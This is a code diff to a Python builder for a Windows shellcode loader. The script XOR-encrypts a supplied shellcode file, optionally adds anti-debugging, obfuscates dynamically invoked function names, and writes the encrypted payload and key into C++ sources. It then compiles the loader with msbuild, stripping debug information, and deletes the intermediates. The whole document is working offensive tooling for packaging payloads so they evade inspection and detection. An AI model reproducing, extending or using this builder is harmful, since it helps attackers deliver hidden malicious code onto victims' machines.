@@ -5,6 +5,7 @@ import random
 import json
 import string
 import os
+from tqdm import tqdm
 
 def gen_string(length):
     randString = ''
@@ -31,6 +32,9 @@ def init_args():
 
     parser.add_argument('-x', '--xor', help='XOR key to encrypt with', 
                         default=gen_string(256))
+    
+    # parser.add_argument('-x', '--xor', help='XOR key to encrypt with', 
+    #                 default='')
 
     parser.add_argument('-ad', '--anti-debug', help='Enable anti debugging option', 
                         dest='debug', 
@@ -55,7 +59,9 @@ def init_args():
 def xor(data, key):
     outBytes = b''
     keyLen = len(key)
-    for n, i in enumerate(data):
+    if not keyLen:
+        return data
+    for n, i in tqdm(enumerate(data)):
         outBytes += (i ^ key[n % keyLen]).to_bytes(1, "big")
 
     return outBytes
@@ -130,20 +136,32 @@ if __name__ == '__main__':
     try:
         with open(args.bin, 'rb') as f:
             binData = f.read()
-
+        
+        print("Encrypting shellcode...")
         binData = xor(bytearray(binData), args.xor.encode())
         # print(binData)
         # quit()
 
-        stringConstruct = "unsigned char shellcode[] = \n\""
+        with open("src/headers/shellcode.h", "r") as header:
+            headerData = header.read()
 
-        for n, i in enumerate(binData):
-            stringConstruct += f"\\{hex(i)[1:]}"
-            if (n + 1) % 14 == 0:
-                stringConstruct += '"\n"'
-        stringConstruct += '";'
-        source = source.replace('<SHELLCODE>', stringConstruct)
-        source = source.replace('<XOR_KEY>', f'"{args.xor}"')
+        headerData = headerData.replace('<XOR_KEY>', f'"{args.xor}"')
+
+        with open("ShellcodeLoaderBuilder/shellcode.h", 'w') as f:
+            f.write(headerData)
+
+        with open("ShellcodeLoaderBuilder/binary_data.bin", 'wb') as f:
+            f.write(binData)
+
+        # stringConstruct = "unsigned char shellcode[] = \n\""
+
+        # for n, i in enumerate(binData):
+        #     stringConstruct += f"\\{hex(i)[1:]}"
+        #     if (n + 1) % 14 == 0:
+        #         stringConstruct += '"\n"'
+        # stringConstruct += '";'
+        # source = source.replace('<SHELLCODE>', stringConstruct)
+        # source = source.replace('<XOR_KEY>', f'"{args.xor}"')
 
         # XOR and encrypt dynamic invoke stuff
         for func in funcs:
@@ -173,7 +191,10 @@ if __name__ == '__main__':
         with open('ShellcodeLoaderBuilder/Source.cpp', 'w') as f:
             f.write(source)
 
+
         os.system("msbuild ShellcodeLoaderBuilder.sln /p:Configuration=Release /p:DebugSymbols=false /p:DebugType=None")
         os.remove("ShellcodeLoaderBuilder/Source.cpp")
+        os.remove("ShellcodeLoaderBuilder/shellcode.h")
+        os.remove("ShellcodeLoaderBuilder/binary_data.bin")
     except FileNotFoundError:
         print('Invalid file')
